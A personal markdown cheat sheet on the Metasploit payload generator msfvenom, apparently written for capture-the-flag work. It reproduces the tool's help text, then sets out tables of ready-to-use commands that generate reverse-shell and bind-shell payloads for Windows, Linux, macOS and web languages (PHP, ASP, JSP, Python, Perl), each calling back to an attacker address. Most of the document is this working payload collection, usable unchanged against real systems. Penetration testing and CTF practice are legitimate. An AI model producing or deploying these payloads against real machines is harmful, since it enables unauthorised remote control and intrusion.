# msfvenom

- [Introduction](#introduction)
- [Usage](#usage)
- [Examples](#examples)

## Introduction

I use msfvenom in capture the flag events when I am trying to get access to a machine or when trying to escalate my privileges. What makes this tool so great is that I can craft a payload and output it in a wide array of formats. Some of those outputs include:

- php script
- python script
- Windows executable
- Windows service
- bash script

## Usage

```bash
$ msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>
Example: /opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```

## Examples

Below are some different payload commands. I have grouped them with a heading to help explain what the payload is for.

### Windows Payloads

| Description | Command |
| --- | --- |
| Windows Reverse TCP Meterpreter | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe` |
| Windows Reverse HTTP Meterpreter | `msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=8080 -f exe > shell_http.exe` |
| Windows Reverse HTTPS Meterpreter | `msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > shell_https.exe` |
| Windows Staged Reverse TCP | `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell_stage.exe` |
| Windows Reverse TCP PowerShell | `msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.ps1` |

### Linux Payloads

| Description | Command |
| --- | --- |
| Linux x86 Reverse TCP | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
| Linux x64 Reverse TCP | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
| Linux Bind TCP | `msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > bind_shell.elf` |

### Web Payloads

| Description | Command |
| --- | --- |
| PHP Reverse TCP | `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php` |
| ASP Reverse TCP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp` |
| JSP Reverse TCP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp` |
| Python Reverse TCP | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py` |
| Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |

### OSX / macOS Payloads

| Description | Command |
| --- | --- |
| macOS Reverse TCP | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > shell.macho` |
